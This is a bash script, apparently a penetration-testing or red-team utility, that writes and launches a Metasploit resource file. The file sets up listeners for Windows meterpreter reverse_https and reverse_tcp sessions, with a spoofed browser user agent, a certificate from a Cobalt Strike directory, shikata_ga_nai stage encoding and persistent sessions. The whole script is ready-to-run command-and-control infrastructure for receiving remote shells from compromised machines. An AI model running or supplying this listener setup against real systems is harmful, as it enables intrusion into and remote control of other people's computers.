#!/bin/bash

DEFROUTE_INT=`route -n | grep "^0.0.0.0" | grep -v "tun[0-9]" | head -1 | awk '{print $8}'`

if [ ${#DEFROUTE_INT} -eq 0 ]; then
	echo "ERROR: unable to identify default route adapter from routing table."
	echo "Default route:"
	route -n | grep "^0.0.0.0"
	exit 1
fi

DEFAULT_IP=`ifconfig $DEFROUTE_INT | grep "inet addr" | grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | head -1`
DNSNAME="" # Set this to a value such as myhost.mydomain.com to override the payload's subsequent calls

if [ ${#DEFAULT_IP} -eq 0 ]; then
	echo "ERROR: Unable to get IP address for $DEFROUTE_INT"
	exit 2
fi

# For HTTPS Listeners
LPORT="443"
LPORT2="5444"

# For TCP Listener
TCPPORT="5445" # Maps to 5222 outside in office setup

if [ $# -gt 0 ]; then
	overriderequesthost=$1
else
	overriderequesthost=""
fi

# Pass overriderequesthost=<val> to use a different name/ip
HandlerSSLCert=/opt/cobaltstrike/rev_https_cert.pem
MeterpreterUserAgent="Mozilla/5.0 (Windows NT 6.3\; rv:36.0) Gecko/20100101 Firefox/36.0"
# Note that overrideLPort is also available

echo "[`date`] Setting up handler for $DEFAULT_IP:$LPORT..."

echo "use exploit/multi/handler" > /tmp/msf_revhandler.rc
echo "set PAYLOAD windows/meterpreter/reverse_https" >> /tmp/msf_revhandler.rc
echo "set LHOST $DEFAULT_IP" >> /tmp/msf_revhandler.rc

if [ ${#DNSNAME} -gt 0 ]; then
	# Note: There's also an OVERRIDELPORT if you need it
	echo "set OVERRIDELHOST $DEFAULT_IP" >> /tmp/msf_revhandler.rc
fi

echo "set LPORT $LPORT" >> /tmp/msf_revhandler.rc
echo "set HandlerSSLCert $HandlerSSLCert" >> /tmp/msf_revhandler.rc
echo "set MeterpreterUserAgent '$MeterpreterUserAgent'" >> /tmp/msf_revhandler.rc
echo "set ExitOnSession false" >> /tmp/msf_revhandler.rc
echo "set EnableContextEncoding true" >> /tmp/msf_revhandler.rc
echo "set SessionCommunicationTimeout 0" >> /tmp/msf_revhandler.rc

if [ ${#overriderequesthost} -gt 0 ]; then
	echo "set overriderequesthost $overriderequesthost" >> /tmp/msf_revhandler.rc
fi

echo "exploit -j" >> /tmp/msf_revhandler.rc

if [ ${#LPORT2} -gt 0 ]; then
	echo "set LPORT $LPORT2" >> /tmp/msf_revhandler.rc
	echo "exploit -j" >> /tmp/msf_revhandler.rc
fi

if [ ${#TCPPORT} -gt 0 ]; then
	echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/msf_revhandler.rc
	echo "set LHOST $DEFAULT_IP" >> /tmp/msf_revhandler.rc
	echo "set LPORT $TCPPORT" >> /tmp/msf_revhandler.rc
	echo "set ExitOnSession false" >> /tmp/msf_revhandler.rc
	echo "set EnableStageEncoding true" >> /tmp/msf_revhandler.rc
	echo "set StageEncoder x86/shikata_ga_nai" >> /tmp/msf_revhandler.rc
	echo "set SessionCommunicationTimeout 0" >> /tmp/msf_revhandler.rc

	echo "exploit -j" >> /tmp/msf_revhandler.rc
fi

echo "[`date`] Starting meterpreter listeners..."
msfconsole -r /tmp/msf_revhandler.rc

